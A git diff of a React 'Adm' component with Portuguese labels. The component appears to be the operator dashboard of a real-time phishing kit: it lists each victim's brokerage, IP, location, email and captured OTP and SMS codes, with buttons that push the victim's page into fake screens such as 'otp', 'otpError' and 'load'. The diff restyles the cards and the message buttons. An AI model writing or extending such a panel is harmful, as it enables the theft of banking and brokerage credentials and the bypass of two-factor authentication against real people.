@@ -85,25 +85,44 @@ export default function Adm({ip,socket}) {
     setMsg( event.target.value );
   };
 
+  function obterClasseCena(cena) {
+    const cenaParaClasse = {
+      'email': 'email',
+      'otp': 'otp',
+      'otpError': 'otp_Error',
+      'otpSMS': 'otp_sms',
+      'load': 'load',
+      'otp2': 'otp2',
+      // Adicione mais mapeamentos conforme necessário
+    };
+  
+    return cenaParaClasse[cena] || ''; // Retorna a classe correspondente ou uma string vazia
+  }
+
   return (
    
   <div className="cards-container">
       {lista.map((item, index) => (
         <div key={index} className="card">
-          <div className="card-header">
+          <div className={item.online ? 'card-headerOnline' : 'card-headerOffline'}>
           <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
+          
             {/* Informações importantes no cabeçalho do card */}
-            Corretora: {item.corretora} | IP: {item.ip}
+            {item.corretora} | {item.ip} <br />
+            {item.countryCode} {item.city}
+
+            
           </div>
           <div className="card-body">
-            {/* Corpo do card com as informações como um formulário preenchido */}
-            País: {item.countryCode}<br/>
-            Cidade: {item.city}<br/>
-            Última Atualização: {moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}<br/>
-            Email: {item.email}<br/>
-            OTP: {item.OTP}<br/>
-            OTP SMS/MSG: {item.OTP2}<br/>
-            Cena: {item.cena}
+            <div className="email2">{item.email}</div>
+            <div className={`cena ${obterClasseCena(item.cena)}`}>{item.cena}</div>
+            
+            <div className="otp1">{item.OTP}</div>
+            
+            <div className="otp2">{item.OTP2}</div>
+         
+            
+            <div className="atualizacao">{moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}</div>
           </div>
           <div className="card-footer">
             {/* Botões no rodapé do card */}
@@ -114,12 +133,7 @@ export default function Adm({ip,socket}) {
                       
                       <button className="btn btn-primary btn-sm teste" type="submit" id="load">load</button>
                       
-                      <div className="nav-links__item nav-dropdown">
-                        <button className="nav-dropdown__toggle nav-link">
-                          Enviar Mensagem
-                        </button>
-                        <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--md">
-                          <div className="nav-dropdown-menu__inner">
+                      <div className="nav-dropdown-menu__inner">
                             <ul className="nav-dropdown-list nav-dropdown-list--primary">
                               <li className="drop-down-item">
                                 <input id="mensagem" name="mensagem" type="text" placeholder="" className="form-input__input" 
@@ -127,13 +141,11 @@ export default function Adm({ip,socket}) {
                                 autoFocus></input>
                               </li>
                               <li className="drop-down-item">
-                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp2">Mensagem Customizada</button>
-                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_sms">SMS (2 dig.)</button>
+                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp2">MSG CUSTOM</button>
+                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_sms">****99</button>
                               </li>
                             </ul>
                           </div>
-                        </div>
-                      </div>
                   </form>
           </div>
         </div>
